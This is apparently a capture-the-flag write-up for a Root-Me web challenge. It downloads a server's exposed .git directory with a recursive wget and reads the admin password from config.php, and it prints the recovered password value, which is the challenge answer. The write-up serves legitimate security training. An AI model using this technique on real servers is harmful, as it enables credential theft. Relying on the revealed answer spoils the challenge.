@@ -1,0 +1,16 @@
+Challenge : Get the password (in clear text) from the admin account.
+Site : http://challenge01.root-me.org/web-serveur/ch61/
+
+1: I'm browse the site and i found the login page. This article will cover the part of Git version control feature and
+   how attackers can gain sensitive information if it is exposed in .git directories of the webservers.
+2: So, i'm directly access to ".git" directory of this server and downloaded this directory with wget command.
+   Command:
+wget -r http://challenge01.root-me.org/web-serveur/ch61/.git
+   Command:
+3: If i got this directory, i'm installed "git-cola" on windows and open this directory. After open, i found FLAG in config.php.
+   config.php:
+ <?php
+ 	$username = "admin";
+-	$password = "**********";
++	$password = "0c25a741349bfdcc1e579c8cd4a931fca66bdb49b9f042c4d92ae1bfa3176d8c";
+   config.php:
